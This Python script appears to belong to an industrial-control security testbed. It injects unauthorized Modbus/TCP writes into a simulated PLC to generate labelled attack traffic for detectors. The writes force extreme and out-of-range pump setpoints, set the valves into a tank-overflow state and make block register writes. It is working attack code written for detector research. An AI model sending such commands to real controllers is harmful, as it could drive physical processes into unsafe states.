"""
Command-injection attack against the Modbus/TCP PLC.

Threat model: an attacker who can reach the PLC crafts unauthorized write
requests directly - no operator, no HMI involvement - to drive the process to
a dangerous state. Because Modbus/TCP accepts any well-formed request from any
source, these land as legitimate control actions.

Injected actions (all writes to actuator/setpoint addresses):
  * FC6  - force pump setpoint to an extreme value (100%, and 0%).
  * FC5  - force the inlet valve open and the outlet valve shut (fill the
           tank while blocking its drain - an overflow-tending state).
  * FC16 - a multi-register block write pushing setpoint + level together,
           the kind of one-shot state change an attacker uses to move several
           points before an operator can react.
  * FC6  - an out-of-band value write (setpoint far above the plausible
           operating band) to exercise the detectors' value-range checks.

It uses an ordinary ephemeral source port and reports the actual port on
stdout (`SOURCE_PORT=<n>`) so the orchestrator can record it as ground truth.

Varied mode (`--seed N`): without a seed the six commands above are sent in
the same order, 0.5 s apart, every run (the official 10-run results). With a
seed, plan() draws 3-8 commands from the same kinds (extreme setpoint,
out-of-range setpoint, valve coil, FC16 block write) plus one the fixed
sequence never sends - an in-band setpoint (20-90%, a value the operator
also writes) - with random values, a random starting transaction ID and a
random 0.3-2.0 s gap before each next command. The drawn parameters are
printed as a `PARAMS=<json>` line for the manifest.

Usage (normally invoked by attacks/run_scenario.py):
    python attacks/command_injection.py
    python attacks/command_injection.py --seed 7
"""

import json
import random
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus_frames import (  # noqa: E402
    log_packet, write_single_register, write_single_coil, write_multiple_registers,
)

TAP_HOST = "127.0.0.1"
TAP_PORT = 5021

HR_LEVEL = 0
HR_PUMP_SETPOINT = 1
COIL_INLET_VALVE = 0
COIL_OUTLET_VALVE = 1

SPACING = 0.5                  # seconds between injected commands

# The fixed sequence. Each command: fc, address, value (FC16: list of values).
FIXED_COMMANDS = [
    {"fc": 6, "address": HR_PUMP_SETPOINT, "value": 100, "kind": "setpoint_extreme"},
    {"fc": 5, "address": COIL_INLET_VALVE, "value": 1, "kind": "coil"},
    {"fc": 5, "address": COIL_OUTLET_VALVE, "value": 0, "kind": "coil"},
    {"fc": 16, "address": HR_LEVEL, "value": [999, 100], "kind": "block"},
    {"fc": 6, "address": HR_PUMP_SETPOINT, "value": 60000, "kind": "setpoint_out_of_range"},
    {"fc": 6, "address": HR_PUMP_SETPOINT, "value": 0, "kind": "setpoint_extreme"},
]
KINDS = ("setpoint_extreme", "setpoint_in_band", "setpoint_out_of_range", "coil", "block")


def random_command(rng: random.Random) -> dict:
    kind = rng.choice(KINDS)
    if kind == "setpoint_extreme":
        value = rng.choice([rng.randint(95, 100), rng.randint(0, 15)])
        return {"fc": 6, "address": HR_PUMP_SETPOINT, "value": value, "kind": kind}
    if kind == "setpoint_in_band":
        return {"fc": 6, "address": HR_PUMP_SETPOINT, "value": rng.randrange(20, 95, 5),
                "kind": kind}
    if kind == "setpoint_out_of_range":
        return {"fc": 6, "address": HR_PUMP_SETPOINT, "value": rng.randint(101, 65535),
                "kind": kind}
    if kind == "coil":
        return {"fc": 5, "address": rng.choice([COIL_INLET_VALVE, COIL_OUTLET_VALVE]),
                "value": rng.choice([0, 1]), "kind": kind}
    return {"fc": 16, "address": HR_LEVEL,
            "value": [rng.randint(0, 999), rng.randint(0, 100)], "kind": kind}


def plan(seed: int | None = None) -> dict:
    """The injection's parameters: the fixed defaults, or (with a seed) a
    random draw. Plain data so it can be logged and tested."""
    if seed is None:
        return {"txid": 0x7000, "commands": FIXED_COMMANDS,
                "spacing": [SPACING] * len(FIXED_COMMANDS)}
    rng = random.Random(seed)
    n = rng.randint(3, 8)
    return {"txid": rng.randrange(0x10000 - n),
            "commands": [random_command(rng) for _ in range(n)],
            "spacing": [round(rng.uniform(0.3, 2.0), 3) for _ in range(n)]}


def frame_for(cmd: dict, txid: int) -> bytes:
    if cmd["fc"] == 5:
        return write_single_coil(txid, cmd["address"], on=bool(cmd["value"]))
    if cmd["fc"] == 16:
        return write_multiple_registers(txid, cmd["address"], cmd["value"])
    return write_single_register(txid, cmd["address"], cmd["value"])


def parse_seed(argv: list[str]) -> int | None:
    if "--seed" in argv:
        return int(argv[argv.index("--seed") + 1])
    return None


def connect() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TAP_HOST, TAP_PORT))
    return sock


def send(sock: socket.socket, frame: bytes, describe: str, spacing: float) -> None:
    log_packet(frame, "attack", describe)
    sock.sendall(frame)
    try:
        sock.recv(256)
    except OSError:
        pass
    print(f"[inject] {describe}")
    time.sleep(spacing)


def main() -> None:
    p = plan(parse_seed(sys.argv))
    print("PARAMS=" + json.dumps(p), flush=True)
    sock = connect()
    source_port = sock.getsockname()[1]
    # Reported on stdout so the orchestrator can label this session's frames.
    print(f"SOURCE_PORT={source_port}", flush=True)
    print(f"[inject] connected via tap {TAP_HOST}:{TAP_PORT} "
          f"(source port {source_port})")

    # Attacker manages its own transaction IDs, incrementing like a real master
    # would - so, unlike the replay, these look fresh; it's the *content and
    # source* that are unauthorized, not the framing.
    for i, (cmd, gap) in enumerate(zip(p["commands"], p["spacing"])):
        send(sock, frame_for(cmd, p["txid"] + i),
             f"FC{cmd['fc']} {cmd['kind']} addr {cmd['address']} -> {cmd['value']}", gap)

    sock.close()
    print("[inject] done.")


if __name__ == "__main__":
    main()
